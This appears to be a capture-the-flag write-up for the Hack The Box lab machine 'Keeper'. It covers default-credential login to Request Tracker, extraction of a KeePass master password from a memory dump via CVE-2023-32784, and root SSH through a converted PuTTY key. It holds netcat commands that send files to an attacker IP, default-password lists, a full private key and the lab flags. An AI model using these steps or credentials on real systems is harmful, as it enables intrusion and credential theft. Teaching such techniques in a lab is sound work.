# HTB - Keeper - 10.129.229.41

## HTB - Keeper

### Machine Info

* **Difficulty:** Easy
* **OS:** Linux (Ubuntu 22.04.3 LTS)
* **IP:** 10.129.229.41
* **Key Skills:** Default credentials, KeePass exploitation, CVE-2023-32784, PuTTY key conversion

### Overview

Keeper is an easy Linux box that focuses on password management exploitation. The attack path involves discovering a Request Tracker ticketing system with default credentials, finding KeePass database files in a user's home directory, exploiting a KeePass memory dump vulnerability to extract the master password, and finally converting a PuTTY private key to gain root SSH access. It's a straightforward box that teaches credential hunting and password manager vulnerabilities.

**Key Concepts:**

* Default credential exploitation
* Request Tracker enumeration
* KeePass master password extraction (CVE-2023-32784)
* Memory dump analysis
* PuTTY to OpenSSH key conversion

**Common Ports:**

* **22/TCP** - SSH (OpenSSH 8.9p1)
* **80/TCP** - HTTP (nginx 1.18.0)

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals SSH and HTTP ├─ Discover virtual host: keeper.htb └─ Find subdomain: tickets.keeper.htb
2. **Web Application Access** ├─ Identify Request Tracker login portal ├─ Test default credentials: root:password ├─ Enumerate registered users └─ Extract initial password from user notes
3. **Initial Access** ├─ Find password in lnorgaard's profile ├─ SSH login with discovered credentials ├─ Discover KeePass files in home directory └─ Capture user flag
4. **KeePass Exploitation** ├─ Analyze KeePassDumpFull.dmp memory dump ├─ Exploit CVE-2023-32784 to extract master password ├─ Crack partial password using pattern matching ├─ Open KeePass database └─ Extract root credentials and SSH key
5. **Privilege Escalation to Root** ├─ Extract PuTTY private key from KeePass ├─ Convert PPK format to OpenSSH format ├─ SSH as root using converted key └─ Capture root flag

***

### Initial Enumeration

#### Port Scanning

Let's see what's running:

```bash
nmap -Pn -sCV -T5 10.129.229.41 -oN nmap.tcp
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

**What we found:**

* Standard SSH service
* Nginx web server
* Ubuntu Linux system

#### Web Enumeration

**Visiting http://10.129.229.41:**

The page shows a simple message referencing `keeper.htb`

**Add to hosts file:**

```bash
echo "10.129.229.41 keeper.htb tickets.keeper.htb" | sudo tee -a /etc/hosts
```

**Why this matters:** The application uses virtual hosting - different domains serve different content.

***

### Request Tracker Discovery

#### What is Request Tracker?

**Request Tracker (RT)** is an open-source ticketing system used for managing IT support requests, customer service, and bug tracking.

**Accessing the subdomain:**

```
http://tickets.keeper.htb
```

**What we see:** Login portal for Request Tracker system

#### Default Credentials

**Common default credentials for Request Tracker:**

```
Username: root
Password: password
```

**Testing:**

```
http://tickets.keeper.htb
Username: root
Password: password
```

**Success!** We're logged in as administrator.

**Why this works:** Many applications ship with default credentials that administrators forget to change. Always test common defaults:

* admin:admin
* admin:password
* root:password
* root:root

***

### User Enumeration

#### Finding Users

**Navigate to:** Admin → Users → Select

**Registered users found:**

| ID | Username  | Real Name     | Email                | Status  |
| -- | --------- | ------------- | -------------------- | ------- |
| 27 | lnorgaard | Lise Nørgaard | lnorgaard@keeper.htb | Enabled |
| 14 | root      | Enoch Root    | root@localhost       | Enabled |

#### Examining lnorgaard's Profile

**Click on:** lnorgaard user

**In the comments/history section, we find:**

```
New user. Initial password set to Welcome2023!
```

**Key takeaway:** Initial passwords often remain unchanged. Let's try SSH access.

***

### Initial Access - SSH as lnorgaard

#### SSH Login

```bash
ssh lnorgaard@10.129.229.41
Password: Welcome2023!
```

**Output:**

```
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

You have mail.
Last login: Wed Dec 31 02:46:46 2025 from 10.10.14.244
lnorgaard@keeper:~$
```

**We're in!**

#### User Flag

```bash
cat ~/user.txt
```

**Flag:**

```
9d0c32f6abbdf5b797b78a0e7d3cf2ca
```

***

### KeePass Database Discovery

#### Enumeration

**Check home directory:**

```bash
ls -la ~
```

**Found interesting files:**

```bash
ls -la ~/
```

**Discovered a ZIP archive:**

```bash
ls -la
-rw-r--r-- 1 lnorgaard lnorgaard 87382271 May 24  2023 RT30000.zip
```

**Extract it:**

```bash
unzip RT30000.zip
```

**Contents:**

```
passcodes.kdbx
KeePassDumpFull.dmp
```

**What we have:**

1. **passcodes.kdbx** - KeePass database file (encrypted)
2. **KeePassDumpFull.dmp** - Memory dump file

**Why this matters:** The memory dump might contain the master password used to decrypt the KeePass database.

#### Transfer Files to Attacker Machine

**Setup listener on attacker:**

```bash
nc -lvnp 4444 > RT30000.zip
```

**Send from victim:**

```bash
cat RT30000.zip | nc 10.10.14.244 4444
```

**Or use SCP:**

```bash
scp lnorgaard@10.129.229.41:~/RT30000.zip .
```

**Extract on local machine:**

```bash
unzip RT30000.zip
```

***

### KeePass Master Password Extraction

#### Understanding CVE-2023-32784

**What is it?** A vulnerability in KeePass 2.X that allows extracting the master password from memory dumps, even when the database is locked.

**How it works:**

* KeePass stores the master password in cleartext in process memory
* Memory dumps can be analyzed to recover most characters
* First character is unknown, but remaining characters can be extracted
* Creates patterns like: `●dgrd med flde`

**Reference CVE:** CVE-2023-32784

#### Using keedump Tool

**Installation:**

```bash
# Using cargo (Rust package manager)
cargo install keedump

# Or from GitHub
git clone https://github.com/ynuwenhof/keedump
cd keedump
cargo build --release
```

**Running the exploit:**

```bash
keedump -i KeePassDumpFull.dmp
```

**Output:**

```
●{', ,, -, :, =, A, I, M, ], _, `, c}dgrd med flde
```

**What this means:**

* First character: Unknown (shown as ●)
* Possible first chars: ', ,, -, :, =, A, I, M, ], \_, \`, c
* Remaining password: `dgrd med flde`

**The pattern:** `?dgrd med flde`

#### Cracking the Password

**Search the pattern online:**

Google: "dgrd med flde"

**Result found:**

```
rødgrød med fløde
```

**What is it?** A Danish phrase meaning "red porridge with cream" - commonly used as a tongue-twister.

**Why it matches:**

* `rødgrød med fløde` (Danish)
* `dgrd med flde` (extracted pattern)
* The special characters (ø) might not extract properly

**Final password:** `rødgrød med fløde`

***

### Opening the KeePass Database

#### Using KeePassXC

**Install KeePassXC:**

```bash
sudo apt install keepassxc
```

**Open the database:**

```bash
keepassxc passcodes.kdbx
```

**Enter master password:**

```
rødgrød med fløde
```

**Database unlocked!**

#### Extracting Credentials

**Inside the database, we find:**

**Entry:** root credentials

**Username:** root

**Password:** (various entries)

**Notes section contains:**

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
[... private key data ...]
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

**What we found:** A PuTTY private key in PPK format for root SSH access!

***

### Root Access via SSH Key

#### Understanding PuTTY Keys

**PuTTY Key Format (.ppk):**

* Proprietary format used by PuTTY on Windows
* Not compatible with OpenSSH (Linux SSH client)
* Must be converted to OpenSSH format

#### Converting PPK to OpenSSH Format

**Step 1: Save the key**

```bash
cat > putty_key.ppk << 'EOF'
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
EOF
```

**Step 2: Install PuTTY tools**

```bash
sudo apt install putty-tools
```

**Step 3: Convert the key**

```bash
puttygen putty_key.ppk -O private-openssh -o root_id_rsa
```

**Parameters explained:**

* `putty_key.ppk` - Input PPK file
* `-O private-openssh` - Output format (OpenSSH)
* `-o root_id_rsa` - Output filename

**Step 4: Set proper permissions**

```bash
chmod 600 root_id_rsa
```

**Why?** SSH requires private keys to have restrictive permissions (600 = owner read/write only).

#### SSH as Root

```bash
ssh -i root_id_rsa root@10.129.229.41
```

**We're root!**

```bash
root@keeper:~# whoami
root

root@keeper:~# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Root Flag

```bash
cat /root/root.txt
```

**Flag:**

```
d6c4f2979815646bd8a6279e2aafc304
```

***

### Quick Reference

#### Default Credentials Testing

```bash
# Common defaults for Request Tracker
root:password
admin:password

# Always test common combinations
admin:admin
root:root
administrator:password
```

#### KeePass Memory Dump Exploitation

```bash
# Install keedump
cargo install keedump

# Extract master password
keedump -i KeePassDumpFull.dmp

# Pattern matching
# Search extracted pattern online
# Try common phrases/words that match
```

#### PuTTY Key Conversion

```bash
# Install tools
sudo apt install putty-tools

# Convert PPK to OpenSSH
puttygen input.ppk -O private-openssh -o output_key

# Set permissions
chmod 600 output_key

# Use for SSH
ssh -i output_key user@target
```

#### File Transfer Methods

```bash
# SCP (when you have SSH access)
scp user@target:/path/to/file .

# Netcat
# On receiver:
nc -lvnp 4444 > file
# On sender:
cat file | nc ATTACKER_IP 4444

# Base64 over SSH
# Encode on target:
base64 file
# Copy output, decode locally:
echo "BASE64_STRING" | base64 -d > file
```

***

### Troubleshooting

#### KeePass Database Won't Open

**Problem:** Password not working despite correct extraction

**Solution:**

* Try variations of extracted password
* Check for special characters (ø, æ, å in Nordic languages)
* Search the pattern online for common phrases
* Try the pattern with common words: `?dgrd` might be "rødgrød"

**Why it works:** Character encoding issues can cause special characters to not extract properly.

#### PuTTY Key Conversion Fails

**Problem:** `puttygen` command not found or conversion errors

**Solution:**

```bash
# Install PuTTY tools
sudo apt install putty-tools

# Verify the PPK file is complete
head -n 1 putty_key.ppk
# Should show: PuTTY-User-Key-File-3: ssh-rsa

# Check for encryption
grep "Encryption:" putty_key.ppk
# Should show: Encryption: none

# If encrypted, you need the passphrase
puttygen encrypted.ppk -O private-openssh -o output_key
# Will prompt for passphrase
```

#### SSH Key Authentication Fails

**Problem:** "Permission denied (publickey)" error

**Solution:**

```bash
# Check key permissions
ls -la root_id_rsa
# Should be: -rw------- (600)

# Fix permissions
chmod 600 root_id_rsa

# Verify key format
head -n 1 root_id_rsa
# Should show: -----BEGIN OPENSSH PRIVATE KEY-----
# Or: -----BEGIN RSA PRIVATE KEY-----

# Try with verbose mode
ssh -vvv -i root_id_rsa root@target
```

#### Memory Dump Analysis Not Working

**Problem:** keedump not extracting password

**Solution:**

```bash
# Try alternative tool: keepass-password-dumper
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper
dotnet run KeePassDumpFull.dmp

# Or use strings to manually analyze
strings KeePassDumpFull.dmp | grep -i password

# Look for password patterns
strings KeePassDumpFull.dmp | less
# Search for character sequences
```

**Why multiple tools help:** Different implementations may extract characters differently.

***

### Key Takeaways

**What we learned:**

1. **Default credentials** - Always test default credentials on login portals; they're often unchanged in production
2. **Information disclosure** - User profiles and comments in ticketing systems can leak sensitive information like initial passwords
3. **KeePass vulnerability** - CVE-2023-32784 allows extracting master passwords from memory dumps, compromising encrypted databases
4. **Memory forensics** - Process memory dumps can contain sensitive data even after applications lock or close
5. **Key format conversion** - Different SSH implementations use different key formats; conversion tools are essential
6. **Password patterns** - When partial passwords are extracted, search engines and pattern matching can help identify the full password

**Defense recommendations:**

* Change all default credentials immediately after installation
* Avoid storing sensitive notes in user profiles
* Update KeePass to patched versions (≥2.54)
* Use strong, unique master passwords
* Implement memory protection for sensitive applications
* Regularly audit for default credentials across systems
* Use password managers with enhanced security features
* Avoid storing private keys in password managers (use SSH agents instead)
* Implement principle of least privilege for user accounts

***

### Related Topics

* \[\[Default Credentials]]
* \[\[KeePass Exploitation]]
* \[\[Memory Dump Analysis]]
* \[\[SSH Key Management]]
* \[\[Password Manager Security]]
* \[\[Request Tracker]]
